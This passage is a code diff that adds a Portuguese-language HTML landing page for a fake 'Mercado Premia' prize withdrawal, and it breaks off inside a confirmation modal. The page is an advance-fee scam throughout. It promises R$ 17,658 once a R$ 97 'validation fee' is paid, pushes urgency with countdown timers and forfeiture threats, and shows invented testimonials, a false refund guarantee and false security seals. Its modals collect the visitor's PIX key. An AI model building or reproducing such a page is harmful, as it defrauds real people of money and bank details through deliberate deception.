@@ -1,0 +1,729 @@
+<!DOCTYPE html>
+<html lang="pt-PT">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mercado Premia - Saque Liberado</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- FontAwesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts Inter -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #1e3a8a;
+        }
+        .pulse-btn {
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(234, 179, 8, 0.5); }
+            70% { transform: scale(1.02); box-shadow: 0 0 0 12px rgba(234, 179, 8, 0); }
+            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(234, 179, 8, 0); }
+        }
+    </style>
+</head>
+<body class="bg-blue-950 text-gray-800 antialiased flex justify-center items-center min-h-screen">
+
+    <div class="w-full max-w-md bg-white min-h-screen shadow-2xl flex flex-col justify-between overflow-hidden relative">
+
+        <!-- Top Banner / Header -->
+        <header class="w-full bg-white pt-4 pb-2 px-4 text-center sticky top-0 z-40 shadow-sm border-b border-amber-100">
+            <div class="inline-flex items-center gap-2 bg-amber-50 border border-amber-300 text-amber-800 px-4 py-1.5 rounded-full text-xs font-bold tracking-wide">
+                <i class="fa-solid fa-circle-check text-amber-600"></i>
+                SAQUE MERCADO PREMIA LIBERADO
+            </div>
+        </header>
+
+        <!-- Main Content Wrapper -->
+        <main class="p-5 space-y-6">
+
+            <div class="flex justify-center pt-2">
+                
+            </div>
+
+            <div class="text-center space-y-3">
+                <h1 class="text-2xl sm:text-3xl font-extrabold text-gray-900 leading-tight">
+                    Seu saque de <span class="text-blue-600 font-black">R$ 17.658</span> do Mercado Premia pode ser liberado ainda hoje
+                </h1>
+                <p class="text-sm text-gray-600 leading-relaxed px-1">
+                    O sistema já processou os seus ganhos. O saldo de <strong class="text-gray-900">R$ 17.658,00</strong> está <span class="bg-amber-100 text-amber-800 px-1 rounded font-medium">reservado na central</span>, aguardando apenas a sua validação final para ser enviado.
+                </p>
+            </div>
+
+            <!-- Timer Box -->
+            <div class="bg-amber-50 border border-amber-300 rounded-2xl py-3 px-4 flex items-center justify-center gap-3 shadow-sm">
+                <div class="w-8 h-8 rounded-full bg-amber-100 flex items-center justify-center text-amber-700">
+                    <i class="fa-regular fa-clock animate-spin" style="animation-duration: 4s;"></i>
+                </div>
+                <div class="text-sm font-bold text-amber-900">
+                    Tempo limite de liberação: <span id="countdown" class="text-amber-700 font-extrabold text-base tracking-wider">08:51</span>
+                </div>
+            </div>
+
+            <div class="grid grid-cols-3 gap-2 text-center">
+                <div class="bg-gray-50 border border-gray-200 rounded-xl py-2.5 px-1 flex flex-col items-center justify-center gap-1">
+                    <i class="fa-solid fa-shield-halved text-blue-600 text-sm"></i>
+                    <span class="text-[11px] font-semibold text-gray-700">100% Seguro</span>
+                </div>
+                <div class="bg-gray-50 border border-gray-200 rounded-xl py-2.5 px-1 flex flex-col items-center justify-center gap-1">
+                    <i class="fa-solid fa-bolt text-amber-500 text-sm"></i>
+                    <span class="text-[11px] font-semibold text-gray-700">PIX em minutos</span>
+                </div>
+                <div class="bg-gray-50 border border-gray-200 rounded-xl py-2.5 px-1 flex flex-col items-center justify-center gap-1">
+                    <i class="fa-solid fa-lock text-blue-600 text-sm"></i>
+                    <span class="text-[11px] font-semibold text-gray-700">Dados protegidos</span>
+                </div>
+            </div>
+
+            <!-- Attention Box -->
+            <div class="bg-white border-2 border-amber-500 rounded-2xl p-4 shadow-sm space-y-3 relative overflow-hidden">
+                <div class="absolute top-0 right-0 bg-amber-500 text-blue-950 text-[10px] font-extrabold px-3 py-1 rounded-bl-xl uppercase tracking-wider">
+                    Urgente
+                </div>
+                <h3 class="font-bold text-gray-900 text-sm flex items-center gap-2">
+                    <i class="fa-solid fa-triangle-exclamation text-amber-500"></i> Atenção: Ação Obrigatória
+                </h3>
+                <p class="text-xs text-gray-600 leading-relaxed">
+                    Esse valor só será liberado se você <strong class="text-gray-900 font-bold">confirmar ainda hoje</strong>. Se não validar dentro do prazo, o sistema automaticamente:
+                </p>
+                <div class="space-y-2 pt-1 text-xs text-gray-700">
+                    <div class="flex items-start gap-2">
+                        <div class="w-4 h-4 rounded-full bg-amber-100 text-amber-700 flex items-center justify-center shrink-0 mt-0.5 text-[10px] font-bold">✕</div>
+                        <span>Bloqueia o saque sorteado pelo Mercado Premia Brasil</span>
+                    </div>
+                    <div class="flex items-start gap-2">
+                        <div class="w-4 h-4 rounded-full bg-amber-100 text-amber-700 flex items-center justify-center shrink-0 mt-0.5 text-[10px] font-bold">✕</div>
+                        <span>Devolve os R$ 17.658,00 ao fundo dos próximos sorteios</span>
+                    </div>
+                    <div class="flex items-start gap-2">
+                        <div class="w-4 h-4 rounded-full bg-amber-100 text-amber-700 flex items-center justify-center shrink-0 mt-0.5 text-[10px] font-bold">✕</div>
+                        <span>Encerra sua prioridade de acesso na campanha</span>
+                    </div>
+                    <div class="flex items-start gap-2">
+                        <div class="w-4 h-4 rounded-full bg-amber-100 text-amber-700 flex items-center justify-center shrink-0 mt-0.5 text-[10px] font-bold">✕</div>
+                        <span>Impede qualquer liberação posterior do valor</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Certification of Earnings -->
+            <div class="bg-blue-900 text-white rounded-2xl p-5 shadow-md space-y-3 border border-blue-800">
+                <div class="inline-block bg-amber-400 text-blue-950 text-[10px] uppercase font-bold tracking-widest px-2.5 py-1 rounded-full">
+                    Certificação de Ganhos
+                </div>
+                <h3 class="font-extrabold text-lg leading-snug">
+                    De onde vem este valor de R$ 17.658?
+                </h3>
+                <p class="text-xs text-blue-100 leading-relaxed">
+                    O <strong class="text-white">Mercado Premia</strong> repassa aos usuários contemplados os valores das campanhas semanais. O saldo já foi processado no seu nome e a legislação exige que <strong class="text-white">100% deste montante</strong> seja repassado para si. O dinheiro não é aleatório, <strong class="text-white">é resultado</strong>.
+                </p>
+            </div>
+
+            <div class="bg-gray-50 border border-gray-200 rounded-2xl p-4 space-y-3">
+                <h4 class="font-bold text-xs uppercase tracking-wider text-gray-500">Ao confirmar agora, você garante:</h4>
+                
+                <div class="space-y-2.5">
+                    <div class="flex items-start gap-3 bg-white p-3 rounded-xl border border-gray-100 shadow-xs">
+                        <div class="text-blue-600 mt-0.5"><i class="fa-solid fa-circle-check text-base"></i></div>
+                        <div>
+                            <p class="text-xs font-bold text-gray-900">Saque Integral (R$ 17.658,00)</p>
+                            <p class="text-[11px] text-gray-500">Transferido direto para sua chave PIX, sem deduções.</p>
+                        </div>
+                    </div>
+
+                    <div class="flex items-start gap-3 bg-white p-3 rounded-xl border border-gray-100 shadow-xs">
+                        <div class="text-blue-600 mt-0.5"><i class="fa-solid fa-circle-check text-base"></i></div>
+                        <div>
+                            <p class="text-xs font-bold text-gray-900">Participação VIP nos próximos sorteios</p>
+                            <p class="text-[11px] text-gray-500">Sua conta segue ativa nos sorteios semanais.</p>
+                        </div>
+                    </div>
+
+                    <div class="flex items-start gap-3 bg-white p-3 rounded-xl border border-gray-100 shadow-xs">
+                        <div class="text-blue-600 mt-0.5"><i class="fa-solid fa-circle-check text-base"></i></div>
+                        <div>
+                            <p class="text-xs font-bold text-gray-900">Grupo VIP dos Contemplados</p>
+                            <p class="text-[11px] text-gray-500">Acesso ao grupo exclusivo dos sorteados desta temporada.</p>
+                        </div>
+                    </div>
+
+                    <div class="flex items-start gap-3 bg-white p-3 rounded-xl border border-gray-100 shadow-xs">
+                        <div class="text-blue-600 mt-0.5"><i class="fa-solid fa-circle-check text-base"></i></div>
+                        <div>
+                            <p class="text-xs font-bold text-gray-900">Suporte oficial direto</p>
+                            <p class="text-[11px] text-gray-500">Atendimento prioritário da equipe oficial.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Step by Step Section -->
+            <div class="space-y-4">
+                <h3 class="font-extrabold text-sm uppercase tracking-wide text-gray-900 text-center">
+                    Passo a passo para liberar o seu saque:
+                </h3>
+
+                <div class="space-y-3">
+                    <div class="bg-gray-50 border border-gray-200 rounded-xl p-3.5 flex items-start gap-3">
+                        <div class="w-6 h-6 rounded-full bg-blue-600 text-white font-bold text-xs flex items-center justify-center shrink-0 mt-0.5">1</div>
+                        <div>
+                            <p class="text-xs font-bold text-gray-900">Aperte no Botão Amarelo</p>
+                            <p class="text-[11px] text-gray-600 mt-0.5">Inicie o processo rolando a tela para baixo e clicando em "Pagar R$ 97 e Sacar".</p>
+                        </div>
+                    </div>
+
+                    <div class="bg-gray-50 border border-gray-200 rounded-xl p-3.5 flex items-start gap-3">
+                        <div class="w-6 h-6 rounded-full bg-blue-600 text-white font-bold text-xs flex items-center justify-center shrink-0 mt-0.5">2</div>
+                        <div>
+                            <p class="text-xs font-bold text-gray-900">Cadastre sua Chave PIX</p>
+                            <p class="text-[11px] text-gray-600 mt-0.5">Informe exatamente a chave para onde o sistema deve transferir o dinheiro.</p>
+                        </div>
+                    </div>
+
+                    <div class="bg-gray-50 border border-gray-200 rounded-xl p-3.5 flex items-start gap-3">
+                        <div class="w-6 h-6 rounded-full bg-blue-600 text-white font-bold text-xs flex items-center justify-center shrink-0 mt-0.5">3</div>
+                        <div>
+                            <p class="text-xs font-bold text-gray-900">Efetue o Pagamento de Segurança</p>
+                            <p class="text-[11px] text-gray-600 mt-0.5">Preencha seus dados de pagamento no checkout e pague a taxa única antifraude.</p>
+                        </div>
+                    </div>
+
+                    <div class="bg-gray-50 border border-gray-200 rounded-xl p-3.5 flex items-start gap-3">
+                        <div class="w-6 h-6 rounded-full bg-blue-600 text-white font-bold text-xs flex items-center justify-center shrink-0 mt-0.5">4</div>
+                        <div>
+                            <p class="text-xs font-bold text-gray-900">Saldo Cai na Conta</p>
+                            <p class="text-[11px] text-gray-600 mt-0.5">Após a confirmação da taxa, os R$ 17.658 são depositados automaticamente no seu banco.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-amber-50 border border-amber-300 rounded-xl p-3 text-amber-900 text-[11px] leading-relaxed">
+                    <strong class="font-bold">Atenção:</strong> Apenas gerar a chave PIX e não efetuar o pagamento da taxa não lhe dá direito ao saldo. A liberação ocorre estritamente após a baixa do pagamento.
+                </div>
+            </div>
+
+            <!-- Extrato de Liberação -->
+            <div class="bg-blue-50/80 border-2 border-blue-300 rounded-2xl p-4 shadow-md space-y-4">
+                <div class="text-center">
+                    <span class="text-[10px] uppercase font-bold tracking-widest text-blue-900 bg-blue-100 px-3 py-1 rounded-full">
+                        Extrato de Liberação
+                    </span>
+                </div>
+
+                <div class="bg-white rounded-xl p-3 border border-blue-200 space-y-2 text-xs">
+                    <div class="flex justify-between items-center text-gray-600 border-b border-gray-100 pb-2">
+                        <span>Saldo a Transferir</span>
+                        <span class="font-bold text-blue-600 text-sm">R$ 17.658,00</span>
+                    </div>
+                    <div class="flex justify-between items-center text-gray-600 pt-1">
+                        <span>Taxa de Validação de Dados</span>
+                        <span class="font-bold text-red-600 text-sm">- R$ 97,00</span>
+                    </div>
+                </div>
+
+                <div class="text-center space-y-1">
+                    <p class="text-[11px] text-gray-600 px-2 leading-relaxed">
+                        Para que o sistema libere o seu PIX gigante de <strong class="text-gray-900">R$ 17.658,00</strong>, o gateway exige o pagamento da taxa de validação no valor de:
+                    </p>
+                    <div class="text-3xl font-extrabold text-blue-700 pt-1">
+                        R$ 97,00
+                    </div>
+                </div>
+
+                <!-- CTA Button -->
+                <button onclick="openPixModal()" class="w-full bg-amber-400 hover:bg-amber-500 text-blue-950 font-extrabold py-4 px-4 rounded-xl shadow-lg pulse-btn transition flex flex-col items-center justify-center gap-1 group cursor-pointer border border-amber-500">
+                    <div class="flex items-center gap-2 text-sm sm:text-base">
+                        <i class="fa-solid fa-wallet text-blue-900"></i>
+                        <span>PAGAR R$ 97 E SACAR R$ 17.658 AGORA</span>
+                        <i class="fa-solid fa-chevron-right text-xs group-hover:translate-x-1 transition-transform"></i>
+                    </div>
+                </button>
+
+                <div class="flex items-center justify-center gap-4 text-[11px] text-gray-600 font-medium pt-1">
+                    <span class="flex items-center gap-1"><i class="fa-solid fa-check text-blue-600"></i> PIX</span>
+                    <span class="flex items-center gap-1"><i class="fa-solid fa-shield text-blue-600"></i> Gateway Seguro</span>
+                </div>
+            </div>
+
+            <!-- Guarantee and Live Counters -->
+            <div class="bg-gray-50 border border-gray-200 rounded-2xl p-4 text-center space-y-3">
+                <h4 class="font-bold text-xs uppercase tracking-wider text-gray-900">Garantia de Devolução Rápida</h4>
+                <p class="text-xs text-gray-600 leading-relaxed">
+                    Se o seu PIX de <strong class="text-gray-900">R$ 17.658</strong> não cair na conta em até <strong class="text-gray-900">3 minutos</strong> após o pagamento, a taxa de <strong class="text-gray-900">R$ 97</strong> é devolvida automaticamente para você, sem perguntas.
+                </p>
+                <div class="inline-flex items-center gap-2 bg-amber-50 border border-amber-300 text-amber-900 text-[11px] font-semibold px-3 py-1.5 rounded-full">
+                    <span class="w-2 h-2 rounded-full bg-amber-500 animate-ping"></span>
+                    +18.547 contemplados nesta semana <span class="text-gray-500 font-normal">· já confirmaram e receberam seus prémios · ao vivo</span>
+                </div>
+            </div>
+
+            <!-- Testimonials -->
+            <div class="space-y-4 pt-2">
+                <div class="text-center space-y-1">
+                    <span class="text-[10px] uppercase font-bold tracking-widest text-blue-600">Quem já confirmou, recomenda</span>
+                    <h3 class="font-extrabold text-base text-gray-900">Histórias reais de quem foi sorteado</h3>
+                </div>
+
+                <div class="space-y-3">
+                    <!-- Testimonial 1 -->
+                    <div class="bg-gray-50 border border-gray-200 rounded-xl p-3.5 space-y-2 shadow-xs">
+                        <div class="flex items-center justify-between">
+                            <div class="flex items-center gap-2.5">
+                                <img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=100&h=100&fit=crop&crop=face" alt="Ana Beatriz" class="w-9 h-9 rounded-full object-cover border border-blue-200">
+                                <div>
+                                    <h5 class="text-xs font-bold text-gray-900">Ana Beatriz</h5>
+                                    <div class="flex text-amber-400 text-[10px]">
+                                        <i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i>
+                                    </div>
+                                </div>
+                            </div>
+                            <span class="text-[10px] text-gray-400 font-medium">Há 2 min</span>
+                        </div>
+                        <p class="text-xs text-gray-600 leading-relaxed">
+                            Achei que era brincadeira, mas resolvi confirmar. Em poucos minutos a notificação do banco apareceu com os R$ 17.658,00! 🙏🥳
+                        </p>
+                    </div>
+
+                    <!-- Testimonial 2 -->
+                    <div class="bg-gray-50 border border-gray-200 rounded-xl p-3.5 space-y-2 shadow-xs">
+                        <div class="flex items-center justify-between">
+                            <div class="flex items-center gap-2.5">
+                                <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=100&h=100&fit=crop&crop=face" alt="Rafael Torres" class="w-9 h-9 rounded-full object-cover border border-blue-200">
+                                <div>
+                                    <h5 class="text-xs font-bold text-gray-900">Rafael Torres</h5>
+                                    <div class="flex text-amber-400 text-[10px]">
+                                        <i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i>
+                                    </div>
+                                </div>
+                            </div>
+                            <span class="text-[10px] text-gray-400 font-medium">Há 5 min</span>
+                        </div>
+                        <p class="text-xs text-gray-600 leading-relaxed">
+                            Recebi a mensagem dos sorteios semanais e fui contemplado essa semana. Confirmei meus dados e o Nubank apitou com o PIX!!!
+                        </p>
+                    </div>
+
+                    <!-- Testimonial 3 -->
+                    <div class="bg-gray-50 border border-gray-200 rounded-xl p-3.5 space-y-2 shadow-xs">
+                        <div class="flex items-center justify-between">
+                            <div class="flex items-center gap-2.5">
+                                <img src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=100&h=100&fit=crop&crop=face" alt="Marcos Silva" class="w-9 h-9 rounded-full object-cover border border-blue-200">
+                                <div>
+                                    <h5 class="text-xs font-bold text-gray-900">Marcos Silva</h5>
+                                    <div class="flex text-amber-400 text-[10px]">
+                                        <i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i>
+                                    </div>
+                                </div>
+                            </div>
+                            <span class="text-[10px] text-gray-400 font-medium">Há 12 min</span>
+                        </div>
+                        <p class="text-xs text-gray-600 leading-relaxed">
+                            Sistema confiável. Validei a chave PIX e o desbloqueio foi automático. Vale demais ser contemplado.
+                        </p>
+                    </div>
+
+                    <!-- Testimonial 4 -->
+                    <div class="bg-gray-50 border border-gray-200 rounded-xl p-3.5 space-y-2 shadow-xs">
+                        <div class="flex items-center justify-between">
+                            <div class="flex items-center gap-2.5">
+                                <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=100&h=100&fit=crop&crop=face" alt="Simone Albuquerque" class="w-9 h-9 rounded-full object-cover border border-blue-200">
+                                <div>
+                                    <h5 class="text-xs font-bold text-gray-900">Simone Albuquerque</h5>
+                                    <div class="flex text-amber-400 text-[10px]">
+                                        <i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i>
+                                    </div>
+                                </div>
+                            </div>
+                            <span class="text-[10px] text-gray-400 font-medium">Há 18 min</span>
+                        </div>
+                        <p class="text-xs text-gray-600 leading-relaxed">
+                            Já caí em muito golpe, mas a garantia me deu segurança. Saque liberado direto na chave do meu CPF.
+                        </p>
+                    </div>
+
+                    <!-- Testimonial 5 -->
+                    <div class="bg-gray-50 border border-gray-200 rounded-xl p-3.5 space-y-2 shadow-xs">
+                        <div class="flex items-center justify-between">
+                            <div class="flex items-center gap-2.5">
+                                <img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?w=100&h=100&fit=crop&crop=face" alt="Juliana Mendes" class="w-9 h-9 rounded-full object-cover border border-blue-200">
+                                <div>
+                                    <h5 class="text-xs font-bold text-gray-900">Juliana Mendes</h5>
+                                    <div class="flex text-amber-400 text-[10px]">
+                                        <i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i>
+                                    </div>
+                                </div>
+                            </div>
+                            <span class="text-[10px] text-gray-400 font-medium">Há 25 min</span>
+                        </div>
+                        <p class="text-xs text-gray-600 leading-relaxed">
+                            Tava tremendo, mas 2 minutos depois a Caixa avisou da transferência. Gratidão por participar!
+                        </p>
+                    </div>
+
+                    <!-- Testimonial 6 -->
+                    <div class="bg-gray-50 border border-gray-200 rounded-xl p-3.5 space-y-2 shadow-xs">
+                        <div class="flex items-center justify-between">
+                            <div class="flex items-center gap-2.5">
+                                <img src="https://images.unsplash.com/photo-1522075469751-3a6694fb2f61?w=100&h=100&fit=crop&crop=face" alt="Fernando Costa" class="w-9 h-9 rounded-full object-cover border border-blue-200">
+                                <div>
+                                    <h5 class="text-xs font-bold text-gray-900">Fernando Costa</h5>
+                                    <div class="flex text-amber-400 text-[10px]">
+                                        <i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i>
+                                    </div>
+                                </div>
+                            </div>
+                            <span class="text-[10px] text-gray-400 font-medium">Há 33 min</span>
+                        </div>
+                        <p class="text-xs text-gray-600 leading-relaxed">
+                            Confirmei agora! Vou poder quitar o carro. Obrigado Mercado Premia Brasil.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- FAQ Section -->
+            <div class="space-y-3 pt-2">
+                <div class="text-center space-y-1">
+                    <span class="text-[10px] uppercase font-bold tracking-widest text-gray-500">Dúvidas Frequentes</span>
+                    <h3 class="font-extrabold text-lg text-gray-900 flex items-center justify-center gap-2">
+                        <span class="text-amber-500">❓</span> FAQ
+                    </h3>
+                </div>
+
+                <div class="space-y-2 text-xs">
+                    <div class="bg-gray-50 border border-gray-200 rounded-xl p-3.5 flex justify-between items-center cursor-pointer hover:bg-gray-100 transition" onclick="toggleFaq(this)">
+                        <span class="font-bold text-gray-900">1. Como sei que fui realmente sorteado(a)?</span>
+                        <i class="fa-solid fa-chevron-down text-blue-600 text-xs"></i>
+                    </div>
+                    <div class="bg-white border border-gray-200 rounded-xl p-3.5 text-gray-600 hidden">
+                        Sua participação foi selecionada através do nosso algoritmo de campanhas semanais ativas. A validação do seu CPF confirma o direito ao resgate.
+                    </div>
+
+                    <div class="bg-gray-50 border border-gray-200 rounded-xl p-3.5 flex justify-between items-center cursor-pointer hover:bg-gray-100 transition" onclick="toggleFaq(this)">
+                        <span class="font-bold text-gray-900">2. É seguro informar meus dados aqui?</span>
+                        <i class="fa-solid fa-chevron-down text-blue-600 text-xs"></i>
+                    </div>
+                    <div class="bg-white border border-gray-200 rounded-xl p-3.5 text-gray-600 hidden">
+                        Sim, utilizamos criptografia de ponta a ponta e gateway de pagamento certificado para proteger todas as suas informações pessoais e bancárias.
+                    </div>
+
+                    <div class="bg-gray-50 border border-gray-200 rounded-xl p-3.5 flex justify-between items-center cursor-pointer hover:bg-gray-100 transition" onclick="toggleFaq(this)">
+                        <span class="font-bold text-gray-900">3. Quanto tempo o PIX leva para cair?</span>
+                        <i class="fa-solid fa-chevron-down text-blue-600 text-xs"></i>
+                    </div>
+                    <div class="bg-white border border-gray-200 rounded-xl p-3.5 text-gray-600 hidden">
+                        Após a confirmação da taxa única de validação, a transferência via PIX é processada instantaneamente, caindo na sua conta em até 3 minutos.
+                    </div>
+
+                    <div class="bg-gray-50 border border-gray-200 rounded-xl p-3.5 flex justify-between items-center cursor-pointer hover:bg-gray-100 transition" onclick="toggleFaq(this)">
+                        <span class="font-bold text-gray-900">4. Os sorteios são semanais?</span>
+                        <i class="fa-solid fa-chevron-down text-blue-600 text-xs"></i>
+                    </div>
+                    <div class="bg-white border border-gray-200 rounded-xl p-3.5 text-gray-600 hidden">
+                        Sim! Realizamos apurações e sorteios todas as semanas para premiar usuários ativos da nossa plataforma e parceiros.
+                    </div>
+
+                    <div class="bg-gray-50 border border-gray-200 rounded-xl p-3.5 flex justify-between items-center cursor-pointer hover:bg-gray-100 transition" onclick="toggleFaq(this)">
+                        <span class="font-bold text-gray-900">5. Posso confirmar pelo celular?</span>
+                        <i class="fa-solid fa-chevron-down text-blue-600 text-xs"></i>
+                    </div>
+                    <div class="bg-white border border-gray-200 rounded-xl p-3.5 text-gray-600 hidden">
+                        Com certeza! Nosso sistema é totalmente responsivo e otimizado para computadores, tablets e smartphones (Android e iOS).
+                    </div>
+                </div>
+            </div>
+
+            <!-- Bottom Reminder Box -->
+            <div class="bg-white border border-gray-200 rounded-2xl p-5 shadow-sm space-y-4 text-center mt-6">
+                <div class="flex justify-center">
+                    <img src="img.png" alt="Logo" class="h-20 w-auto object-contain">
+                </div>
+
+                <div class="bg-amber-50 border border-amber-300 rounded-xl py-2.5 px-3 inline-flex items-center gap-2 text-xs font-bold text-amber-900">
+                    <i class="fa-regular fa-clock"></i>
+                    Tempo restante: <span id="countdown-bottom" class="text-amber-700 font-extrabold">08:51</span>
+                </div>
+
+                <p class="text-xs text-gray-600 leading-relaxed px-1">
+                    Se você sair desta página sem confirmar, o sistema vai devolver o valor ao fundo interno e encerrar sua prioridade de saque.
+                </p>
+
+                <div class="space-y-1">
+                    <h3 class="text-xl font-extrabold text-gray-900">O SALDO JÁ ESTÁ NO Mercado PREMIA.</h3>
+                    <p class="text-xs text-gray-600">Ele já foi acumulado. Ele já está no seu nome. Agora só falta você liberar o saque.</p>
+                </div>
+
+                <!-- Bottom CTA Button -->
+                <button onclick="openPixModal()" class="w-full bg-amber-400 hover:bg-amber-500 text-blue-950 font-extrabold py-4 px-4 rounded-xl shadow-lg pulse-btn transition flex items-center justify-center gap-2 cursor-pointer border border-amber-500 text-sm sm:text-base">
+                    <i class="fa-solid fa-wallet text-blue-900"></i>
+                    <span>LIBERAR MEU SAQUE DE R$17.658 AGORA</span>
+                    <i class="fa-solid fa-chevron-right text-xs"></i>
+                </button>
+            </div>
+
+        </main>
+
+        <!-- Footer -->
+        <footer class="bg-gray-50 border-t border-gray-200 p-4 text-center text-[10px] text-gray-500 space-y-1">
+            <p>© Mercado Premia Brasil · premiacoes@mercado-oficial.com · Campanha promocional · Termos aplicáveis</p>
+        </footer>
+
+    </div>
+
+    <!-- MODAL CONTAINER -->
+    <div id="modal-container" class="fixed inset-0 bg-black/60 z-50 flex items-center justify-center p-4 hidden">
+        
+        <!-- 1) MODAL: CHAVE PIX -->
+        <div id="modal-pix" class="bg-white rounded-3xl p-6 max-w-sm w-full space-y-6 shadow-2xl relative border border-gray-100 hidden">
+            <button onclick="closeModal()" class="absolute top-4 right-4 text-gray-400 hover:text-gray-600 text-sm">
+                <i class="fa-solid fa-xmark text-lg"></i>
+            </button>
+            
+            <div class="flex justify-center">
+                <div class="w-16 h-16 rounded-full bg-green-50 border border-green-200 flex items-center justify-center text-green-600 text-2xl shadow-sm">
+                    <i class="fa-solid fa-wallet"></i>
+                </div>
+            </div>
+
+            <div class="text-center space-y-2">
+                <h3 class="text-xl font-extrabold text-gray-900 leading-tight">PRA ONDE ENVIAMOS O PIX?</h3>
+                <p class="text-xs text-gray-600 leading-relaxed px-2">
+                    Cadastre a chave exata onde deseja receber os <strong class="text-gray-900 font-bold">R$ 17.658,00</strong> agora mesmo.
+                </p>
+            </div>
+
+            <div class="space-y-2">
+                <label class="block text-[11px] font-extrabold uppercase tracking-wider text-gray-500">SUA CHAVE PIX</label>
+                <input type="text" id="pix-key-input" placeholder="CPF, Celular, E-mail ou Chave Aleatória" class="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-3.5 text-sm text-gray-800 placeholder-gray-400 focus:outline-none focus:border-green-500 focus:ring-1 focus:ring-green-500">
+            </div>
+
+            <button onclick="startProcessing()" class="w-full bg-green-600 hover:bg-green-700 text-white font-extrabold py-4 px-4 rounded-xl shadow-lg transition flex items-center justify-center gap-2 cursor-pointer text-sm">
+                <span>CONFIRMAR MINHA CHAVE</span>
+                <i class="fa-solid fa-chevron-right text-xs"></i>
+            </button>
+
+            <div class="flex items-center justify-center gap-3 text-[10px] text-gray-400 pt-1 font-medium">
+                <span class="flex items-center gap-1"><i class="fa-solid fa-lock text-gray-500"></i> SSL 256-bit</span>
+                <span>·</span>
+                <span>LGPD</span>
+                <span>·</span>
+                <span class="flex items-center gap-1"><i class="fa-solid fa-shield-halved text-gray-500"></i> PIX BACEN</span>
+            </div>
+        </div>
+
+        <!-- 2) MODAL: PROCESSAMENTO / PROGRESSO -->
+        <div id="modal-processing" class="bg-white rounded-3xl p-6 max-w-sm w-full space-y-6 shadow-2xl relative border border-gray-100 text-center hidden">
+            <div class="flex justify-center pt-2">
+                <div class="w-16 h-16 rounded-full bg-blue-50 border border-blue-200 flex items-center justify-center text-blue-600 text-2xl shadow-sm animate-spin">
+                    <i class="fa-solid fa-spinner"></i>
+                </div>
+            </div>
+
+            <div class="space-y-2">
+                <h3 class="text-xl font-extrabold text-gray-900">Processando...</h3>
+                <p class="text-xs text-gray-600 leading-relaxed px-2">
+                    Aguarde enquanto o sistema valida a sua chave e prepara a transferência segura.
+                </p>
+            </div>
+
+            <hr class="border-gray-100">
+
+            <div class="space-y-3 text-left">
+                <p class="text-[11px] font-extrabold uppercase tracking-wider text-gray-500">PROGRESSO DO SISTEMA:</p>
+                
+                <div class="space-y-2 text-xs">
+                    <div id="step-1" class="flex items-center gap-2.5 text-green-600 font-semibold">
+                        <i class="fa-solid fa-circle-check text-sm"></i>
+                        <span>1. Validando chave inserida...</span>
+                    </div>
+                    <div id="step-2" class="flex items-center gap-2.5 text-gray-400 font-medium">
+                        <i class="fa-regular fa-circle text-sm" id="icon-2"></i>
+                        <span>2. Calculando taxa antifraude...</span>
+                    </div>
+                    <div id="step-3" class="flex items-center gap-2.5 text-gray-400 font-medium">
+                        <i class="fa-regular fa-circle text-sm" id="icon-3"></i>
+                        <span>3. Gerando link de saque seguro...</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="space-y-1.5 pt-2">
+                <div class="flex justify-between text-xs font-bold">
+                    <span class="text-gray-500">A concluir</span>
+                    <span id="progress-percent" class="text-blue-600">45%</span>
+                </div>
+                <div class="w-full bg-gray-100 h-2.5 rounded-full overflow-hidden">
+                    <div id="progress-bar" class="bg-blue-600 h-full w-[45%] transition-all duration-300 rounded-full"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 3) MODAL: CHAVE APROVADA & REDIRECT AUTOMÁTICO -->
+        <div id="modal-approved" class="bg-white rounded-3xl p-6 max-w-sm w-full space-y-5 shadow-2xl relative border border-gray-100 text-center hidden">
+            <div class="flex justify-center">
+                <div class="w-16 h-16 rounded-full bg-green-50 border-2 border-green-300 flex items-center justify-center text-green-600 text-2xl shadow-sm">
+                    <i class="fa-solid fa-check"></i>
+                </div>
+            </div>
+
+            <div class="space-y-1.5">
+                <h3 class="text-xl font-extrabold text-gray-900">Chave PIX Aprovada!</h3>
+                <p class="text-xs text-gray-600 leading-relaxed">
+                    Taxa de segurança gerada com sucesso. Redirecionando para liberação do saldo...
+                </p>
+            </div>
+
+            <!-- Warning Box -->
